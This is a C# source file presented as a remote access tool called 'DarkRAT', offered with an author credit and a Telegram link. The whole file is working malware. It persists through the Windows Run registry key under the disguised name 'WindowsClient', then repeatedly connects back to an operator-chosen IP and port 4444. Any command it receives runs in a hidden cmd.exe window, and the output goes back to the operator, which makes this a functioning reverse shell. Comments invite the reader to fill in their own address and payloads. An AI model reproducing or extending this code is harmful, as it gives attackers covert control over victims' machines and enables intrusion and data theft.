
// C# RAT - Full-featured Remote Access Tool (Skeleton)
// Author: Magician Slime https://t.me/magician_slime/
// Note: Implemented core structure, replace with actual payloads.

using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace DarkRAT
{
    class Program
    {
        static string ip = "192.168.1.100"; // Replace With Your ip Address
        static int port = 4444; // Replace With Your Port 

        static void Main(string[] args)
        {
            AddToStartup();
            ConnectToServer();
        }

        static void AddToStartup()
        {
            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("WindowsClient", path);
        }

        static void ConnectToServer()
        {
            while (true)
            {
                try
                {
                    using (TcpClient client = new TcpClient(ip, port))
                    using (NetworkStream stream = client.GetStream())
                    {
                        SendData(stream, "[*] Connected");

                        byte[] buffer = new byte[2048];
                        int bytesRead;

                        while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();

                            if (command == "exit")
                                break;
                            else if (command.StartsWith("cd "))
                            {
                                string path = command.Substring(3);
                                Directory.SetCurrentDirectory(path);
                                SendData(stream, "[+] Changed directory");
                            }
                            else
                            {
                                SendData(stream, ExecuteCommand(command));
                            }
                        }
                    }
                }
                catch
                {
                    Thread.Sleep(10000);
                }
            }
        }

        static string ExecuteCommand(string cmd)
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process proc = Process.Start(psi))
            {
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                return output + error;
            }
        }

        static void SendData(NetworkStream stream, string data)
        {
            byte[] message = Encoding.UTF8.GetBytes(data);
            stream.Write(message, 0, message.Length);
        }
    }
}
